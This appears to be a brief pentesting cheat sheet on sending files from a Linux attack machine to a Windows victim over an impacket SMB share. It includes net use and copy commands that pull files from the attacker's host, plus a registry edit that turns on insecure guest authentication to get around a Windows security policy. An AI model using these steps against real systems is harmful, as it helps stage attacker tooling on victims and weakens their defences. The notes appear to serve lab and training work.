
## Linux to Windows Transfer Methods

- The below methods can be used to transfer file from Linux machine to Windows Machine.
- Linux machine is our Attack Machine.
- Windows machine is our Victim Machine.


## SMB Share Method


### Start SMB server (ATTACK MACHINE)

- We need to specify the directory path we want to share.
- We setup a SMB server in our Attack Machine 

```bash
sudo impacket-smbserver share -smb2support <directory path to share>
```

### Authenticate to the SMB server (VICTIM MACHINE)

- Now that the SMB server has been started we need to provided the credentials of the Attack Machine (`username` and `password`) to authenticate the Victim Machine to the SMB server.
- So provide **username**, **password**, **IP address** of the Attack Machine.
- You will be prompted to enter password later.
- Here `n:` is the drive letter you are assigning to the network share, so that it becomes accessible as a virtual drive in your local pc.

```bash
net use n: \\<Attack Machine IP>\share /user:<username>
```

### Download File from SMB server (VICTIM MACHINE)

- The below command copies the file from the Attack Machine to the Victim Machine.

```bash
copy \\<Attack Machine IP>\share\<filename to download from Attack Machine>
```

- If its saying the transfer is getting blocked because of the following reason  `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.` execute the below command and then retry the `copy` command.
##### ENABLE INSECURE LOGONS

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
```